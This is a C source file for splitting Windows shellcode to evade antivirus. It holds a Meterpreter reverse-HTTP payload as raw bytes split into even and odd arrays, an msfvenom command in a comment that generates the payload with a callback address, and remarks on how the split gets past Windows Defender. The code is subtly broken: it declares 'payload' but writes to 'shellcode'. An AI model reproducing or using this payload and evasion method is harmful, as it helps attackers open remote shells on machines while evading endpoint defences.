#include <windows.h>
#include <stdio.h>

// compile:
//  cl.exe /nologo /MT /W0 /GS- /DNDEBUG /Tctwoarray.c /link /out:twoarray.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
// python3 twoarray.py

#define PAYLOAD_SIZE 593

int main(void)
{
	/* 
		Defender will complain if the even and odd arrays are declared globally.
		I've determined it's identifying the reconstruction routine as the bad bytes.
		Defender does not complain if these variables are declared in the main scope.
		¯\_(ツ)_/¯
	*/
	char evens[297] = {0xfc, 0x83, 0xf0, 0xcc, 0x0, 0x41, 0x41, 0x52, 0x31, 0x51, 0x65, 0x8b, 0x60, 0x8b, 0x18, 0x8b, 0x20, 0x31, 0x48, 0x72, 0x48, 0xb7, 0x4a, 0x31, 0xac, 0x61, 0x2, 0x20, 0xc1, 0xd, 0x1, 0xe2, 0x52, 0x8b, 0x20, 0x51, 0x42, 0x48, 0xd0, 0x81, 0x18, 0x2, 0x85, 0x0, 0x0, 0x80, 0x0, 0x0, 0x85, 0x74, 0x48, 0xd0, 0x8b, 0x20, 0x8b, 0x18, 0x1, 0xe3, 0x4d, 0xc9, 0xff, 0x41, 0x34, 0x48, 0xd6, 0x31, 0xac, 0xc1, 0xd, 0x1, 0x38, 0x75, 0x4c, 0x4c, 0x8, 0x39, 0x75, 0x58, 0x8b, 0x24, 0x1, 0x66, 0x8b, 0x48, 0x8b, 0x1c, 0x1, 0x41, 0x4, 0x48, 0xd0, 0x58, 0x58, 0x59, 0x41, 0x41, 0x41, 0x48, 0xec, 0x41, 0xff, 0x58, 0x59, 0x48, 0x12, 0x4b, 0xff, 0x5d, 0x31, 0x53, 0xbe, 0x69, 0x69, 0x65, 0x0, 0x56, 0x89, 0x49, 0xc2, 0x77, 0x7, 0xd5, 0x53, 0x89, 0x53, 0x4d, 0xc0, 0x31, 0x53, 0x49, 0x3a, 0x79, 0x0, 0x0, 0xff, 0xe8, 0x0, 0x0, 0x39, 0x2e, 0x36, 0x2e, 0x39, 0x2e, 0x33, 0x0, 0x48, 0xc1, 0xc7, 0x50, 0x0, 0x4d, 0xc9, 0x53, 0x3, 0x49, 0x57, 0x9f, 0x0, 0x0, 0xff, 0xe8, 0x0, 0x0, 0x37, 0x4a, 0x49, 0x4b, 0x4c, 0x76, 0x47, 0x4d, 0x6c, 0x4e, 0x71, 0x46, 0x33, 0x72, 0x43, 0x45, 0x6e, 0x6a, 0x4d, 0x32, 0x41, 0x76, 0x31, 0x56, 0x62, 0x32, 0x70, 0x78, 0x71, 0x58, 0x42, 0x37, 0x71, 0x2d, 0x67, 0x0, 0x89, 0x53, 0x41, 0x4d, 0xc9, 0x48, 0x0, 0x28, 0x0, 0x0, 0x50, 0x53, 0xc7, 0xeb, 0x2e, 0xff, 0x48, 0xc6, 0xa, 0x53, 0x48, 0xf1, 0x31, 0x4d, 0xc9, 0x53, 0xc7, 0x2d, 0x18, 0xff, 0x85, 0x75, 0x48, 0xc1, 0x13, 0x0, 0xba, 0xf0, 0xe0, 0x0, 0x0, 0xd5, 0xff, 0x74, 0xeb, 0xe8, 0x0, 0x0, 0x59, 0x40, 0x49, 0xd1, 0xe2, 0x49, 0xc0, 0x10, 0x0, 0xba, 0xa4, 0xe5, 0x0, 0x0, 0xd5, 0x93, 0x53, 0x89, 0x48, 0xf1, 0x89, 0x49, 0xc0, 0x20, 0x0, 0x89, 0x49, 0x12, 0x89, 0x0, 0x0, 0xff, 0x48, 0xc4, 0x85, 0x74, 0x66, 0x7, 0x1, 0x85, 0x75, 0x58, 0x58, 0x0, 0x49, 0xc2, 0xb5, 0x56, 0xd5};

	char odds[296] = {
	0x48, 0xe4, 0xe8, 0x0, 0x0, 0x51, 0x50, 0x48, 0xd2, 0x56, 0x48, 0x52, 0x48, 0x52, 0x48, 0x52, 0x4d, 0xc9, 0x8b, 0x50, 0xf, 0x4a, 0x48, 0xc0, 0x3c, 0x7c, 0x2c, 0x41, 0xc9, 0x41, 0xc1, 0xed, 0x48, 0x52, 0x41, 0x8b, 0x3c, 0x1, 0x66, 0x78, 0xb, 0xf, 0x72, 0x0, 0x8b, 0x88, 0x0, 0x48, 0xc0, 0x67, 0x1, 0x44, 0x40, 0x50, 0x48, 0x49, 0xd0, 0x56, 0x31, 0x48, 0xc9, 0x8b, 0x88, 0x1, 0x48, 0xc0, 0x41, 0xc9, 0x41, 0xc1, 0xe0, 0xf1, 0x3, 0x24, 0x45, 0xd1, 0xd8, 0x44, 0x40, 0x49, 0xd0, 0x41, 0xc, 0x44, 0x40, 0x49, 0xd0, 0x8b, 0x88, 0x1, 0x41, 0x41, 0x5e, 0x5a, 0x58, 0x59, 0x5a, 0x83, 0x20, 0x52, 0xe0, 0x41, 0x5a, 0x8b, 0xe9, 0xff, 0xff, 0x48, 0xdb, 0x49, 0x77, 0x6e, 0x6e, 0x74, 0x41, 0x48, 0xe1, 0xc7, 0x4c, 0x26, 0xff, 0x53, 0x48, 0xe1, 0x5a, 0x31, 0x4d, 0xc9, 0x53, 0xba, 0x56, 0xa7, 0x0, 0x0, 0xd5, 0x10, 0x0, 0x31, 0x32, 0x31, 0x38, 0x31, 0x30, 0x31, 0x34, 0x5a, 0x89, 0x49, 0xc0, 0x0, 0x0, 0x31, 0x53, 0x6a, 0x53, 0xba, 0x89, 0xc6, 0x0, 0x0, 0xd5, 0x48, 0x0, 0x2f, 0x4f, 0x67, 0x32, 0x6c, 0x4f, 0x79, 0x76, 0x59, 0x2d, 0x51, 0x51, 0x6b, 0x53, 0x39, 0x58, 0x57, 0x77, 0x62, 0x76, 0x37, 0x39, 0x43, 0x4a, 0x5f, 0x62, 0x76, 0x4b, 0x62, 0x64, 0x45, 0x47, 0x66, 0x67, 0x4c, 0x62, 0x48, 0xc1, 0x5a, 0x58, 0x31, 0x53, 0xb8, 0x2, 0x84, 0x0, 0x0, 0x53, 0x49, 0xc2, 0x55, 0x3b, 0xd5, 0x89, 0x6a, 0x5f, 0x5a, 0x89, 0x4d, 0xc9, 0x31, 0x53, 0x49, 0xc2, 0x6, 0x7b, 0xd5, 0xc0, 0x1f, 0xc7, 0x88, 0x0, 0x49, 0x44, 0x35, 0x0, 0x0, 0xff, 0x48, 0xcf, 0x2, 0xcc, 0x55, 0x0, 0x53, 0x6a, 0x5a, 0x89, 0xc1, 0x10, 0xc7, 0x0, 0x0, 0x49, 0x58, 0x53, 0x0, 0x0, 0xff, 0x48, 0x53, 0x48, 0xe7, 0x89, 0x48, 0xda, 0xc7, 0x0, 0x0, 0x49, 0xf9, 0xba, 0x96, 0xe2, 0x0, 0x0, 0xd5, 0x83, 0x20, 0xc0, 0xb2, 0x8b, 0x48, 0xc3, 0xc0, 0xd2, 0xc3, 0x6a, 0x59, 0xc7, 0xf0, 0xa2, 0xff};
	
	char payload[PAYLOAD_SIZE] = { 0x00 };
	int twoArrIdx = 0;
	int idx = 0;

	while (idx < PAYLOAD_SIZE)
	{
		// read from the even array
		shellcode[idx] = evens[twoArrIdx];
		
		// odds will be one byte less than evens if PAYLOAD_SIZE is odd
		if ( twoArrIdx == (int)sizeof(odds) )
		{
			// do nothing, otherwise we'll read past the end of our array
		}
		else
		{
			// read from odd array
			shellcode[idx+1] = odds[twoArrIdx];
			
			// increment twoArrIdx to move to the next position in the evens and odds arrays
			twoArrIdx++;
		}

		// we've just added two bytes, so we need to shift two positions instead of one
		idx = idx + 2;
	}

	idx = 0;
	while ( idx < PAYLOAD_SIZE)
	{
		if (idx == (PAYLOAD_SIZE - 1))
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}

    return 0;
}
